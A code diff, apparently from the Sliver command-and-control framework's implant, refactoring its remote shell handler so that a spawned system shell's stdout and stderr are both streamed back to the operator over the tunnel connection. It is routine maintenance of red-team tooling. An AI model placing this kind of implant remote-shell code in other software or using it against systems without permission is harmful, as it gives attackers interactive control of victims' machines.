@@ -67,8 +67,9 @@ func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 
 	tunnel := transports.NewTunnel(
 		shellReq.TunnelID,
-		systemShell.Stdout,
 		systemShell.Stdin,
+		systemShell.Stdout,
+		systemShell.Stderr,
 	)
 	connection.AddTunnel(tunnel)
 
@@ -100,61 +101,35 @@ func ShellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 		}
 	}
 
-	// Handle stderr
-	// Ideally we'd want the tunnel interface to use a slice of io.Readers and iterate over them.
-	// Not sure how that would work with the sequencing stuff in data_handler.go
-	go func() {
-		tWriter := tunnelWriter{
-			conn: connection,
-			tun:  tunnel,
-		}
-		_, err := io.Copy(tWriter, systemShell.Stderr)
+	for _, rc := range tunnel.Readers {
+		go func(outErr io.ReadCloser) {
+			tWriter := tunnelWriter{
+				conn: connection,
+				tun:  tunnel,
+			}
+			_, err := io.Copy(tWriter, outErr)
 
-		if err != nil {
-			cleanup("io error", err)
-			return
-		}
-		if systemShell.Command.ProcessState != nil {
-			if systemShell.Command.ProcessState.Exited() {
-				cleanup("process terminated", nil)
+			if err != nil {
+				cleanup("io error", err)
 				return
 			}
-		}
-		if err == io.EOF {
-			cleanup("EOF", err)
-			return
-		}
-	}()
-
-	go func() {
-		tWriter := tunnelWriter{
-			tun:  tunnel,
-			conn: connection,
-		}
-		_, err := io.Copy(tWriter, tunnel.Reader)
-
-		if err != nil {
-			cleanup("io error", err)
-			return
-		}
-
-		err = systemShell.Wait() // sync wait, since we already locked in io.Copy, and it will release once it's done
-		if err != nil {
-			cleanup("shell wait error", err)
-			return
-		}
-
-		if systemShell.Command.ProcessState != nil {
-			if systemShell.Command.ProcessState.Exited() {
-				cleanup("process terminated", nil)
+			err = systemShell.Wait() // sync wait, since we already locked in io.Copy, and it will release once it's done
+			if err != nil {
+				cleanup("shell wait error", err)
 				return
 			}
-		}
-		if err == io.EOF {
-			cleanup("EOF", err)
-			return
-		}
-	}()
+			if systemShell.Command.ProcessState != nil {
+				if systemShell.Command.ProcessState.Exited() {
+					cleanup("process terminated", nil)
+					return
+				}
+			}
+			if err == io.EOF {
+				cleanup("EOF", err)
+				return
+			}
+		}(rc)
+	}
 
 	// {{if .Config.Debug}}
 	log.Printf("[shell] Started shell with tunnel ID %d", tunnel.ID)
